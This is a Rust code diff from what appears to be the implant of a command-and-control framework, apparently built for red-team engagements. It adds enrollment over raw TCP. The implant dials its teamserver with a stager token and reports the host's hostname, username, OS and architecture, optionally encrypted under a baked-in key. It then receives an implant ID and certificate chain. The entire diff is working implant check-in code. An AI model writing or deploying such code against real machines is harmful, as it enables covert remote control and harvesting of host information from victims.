@@ -51,13 +51,17 @@ impl KeyPair {
     /// The public half as a DER SubjectPublicKeyInfo, base64 over JSON --
     /// exactly what the teamserver reads back via ImportSubjectPublicKeyInfo.
     pub fn public_spki_base64(&self) -> String {
-        let der = self
-            .verifying
+        base64::engine::general_purpose::STANDARD.encode(self.public_spki_der())
+    }
+
+    /// The same SubjectPublicKeyInfo as raw DER: the frame grammar's enroll
+    /// carries certificate material as bytes, not text.
+    pub fn public_spki_der(&self) -> Vec<u8> {
+        self.verifying
             .to_public_key_der()
             .expect("SPKI export")
             .as_bytes()
-            .to_vec();
-        base64::engine::general_purpose::STANDARD.encode(der)
+            .to_vec()
     }
 }
 
@@ -168,6 +172,96 @@ pub fn enroll(url: &str, profile: &Profile, keys: &KeyPair) -> Result<Enrollment
             .and_then(serde_json::Value::as_str)
             .unwrap_or_default()
             .to_string(),
+        ca_chain,
+    })
+}
+
+/// The enroll dispatcher the run walk calls: the socket family's fronts
+/// (tcp://) enroll over their own stream contact, everything else over the
+/// web route's JSON body. Error prefixes stay the walk's vocabulary.
+pub fn enroll_any(url: &str, profile: &Profile, keys: &KeyPair) -> Result<Enrollment, String> {
+    if url.starts_with("tcp://") {
+        return enroll_over_socket(url, profile, keys);
+    }
+    enroll(url, profile, keys)
+}
+
+/// Enrolls over the socket family's stream contact (architecture.md Sec 8,
+/// the full-independence step): the opening message carries the EnrollRequest
+/// frame -- the web route's JSON body promoted into the frame grammar -- and
+/// the answer arrives as an EnrollResponse frame on its own message. Sealed
+/// under the bake's key with the socket exchange's own purpose tags when the
+/// bake carries one; plaintext otherwise (the certificate-less posture).
+fn enroll_over_socket(url: &str, profile: &Profile, keys: &KeyPair) -> Result<Enrollment, String> {
+    use prost::Message;
+
+    let rest = url.strip_prefix("tcp://").unwrap_or(url);
+    let authority = rest.split('/').next().unwrap_or(rest);
+    let mut stream = std::net::TcpStream::connect(authority)
+        .map_err(|e| format!("enroll transport: dial {authority}: {e}"))?;
+    stream.set_nodelay(true).ok();
+
+    let request = crate::wire::EnrollRequest {
+        stager_token_secret: profile.token.clone(),
+        class: String::new(),
+        public_key: keys.public_spki_der(),
+        parent_implant_id: String::new(),
+        hostname: hostname(),
+        os: std::env::consts::OS.to_string(),
+        arch: std::env::consts::ARCH.to_string(),
+        username: username(),
+        kill_date: profile.kill_date.clone().unwrap_or_default(),
+        sleep_seconds: Some(profile.sleep_seconds),
+        jitter_seconds: Some(profile.jitter_seconds),
+    };
+    let frames = crate::wire::encode(&[crate::wire::Frame {
+        payload: request.encode_to_vec(),
+        kind: crate::wire::FrameKind::EnrollRequest as i32,
+    }]);
+    let body = match envelope::parse_baked_key(&profile.envelope_key) {
+        Some((key_id, key)) if profile.contact_envelope == "aesgcm" => {
+            envelope::seal_contact_body(&frames, &key_id, &key, envelope::SOCKET_ENROLL_REQUEST_AAD)
+        }
+        _ => frames,
+    };
+    transport::rawtcp::write_message(&mut stream, &body)
+        .map_err(|e| format!("enroll transport: {e}"))?;
+
+    let response = transport::rawtcp::read_message(&mut stream, false)
+        .ok()
+        .flatten()
+        .ok_or_else(|| "enroll read: the socket closed before the answer".to_string())?;
+    let plain = match envelope::parse_baked_key(&profile.envelope_key) {
+        Some((key_id, key)) if profile.contact_envelope == "aesgcm" => {
+            envelope::try_open_contact_body(
+                &response,
+                &key_id,
+                &key,
+                envelope::SOCKET_ENROLL_RESPONSE_AAD,
+            )
+            .ok_or_else(|| "enroll answer did not verify under the baked key".to_string())?
+        }
+        _ => response,
+    };
+    let frames = crate::wire::parse(&plain)
+        .ok_or_else(|| "enroll answer was not valid framing".to_string())?;
+    let answer = frames
+        .iter()
+        .find(|frame| frame.kind() == crate::wire::FrameKind::EnrollResponse)
+        .and_then(|frame| crate::wire::EnrollResponse::decode(frame.payload.as_ref()).ok())
+        .ok_or_else(|| "enroll answer carried no EnrollResponse frame".to_string())?;
+    if answer.status != crate::wire::rod::EnrollStatus::Ok as i32 {
+        return Err(format!("enroll rejected: status {}", answer.status));
+    }
+
+    let ca_chain = answer
+        .ca_chain
+        .iter()
+        .filter_map(|der| trust::parse_der(der))
+        .collect();
+    Ok(Enrollment {
+        implant_id: answer.implant_id,
+        engagement_id: answer.engagement_id,
         ca_chain,
     })
 }
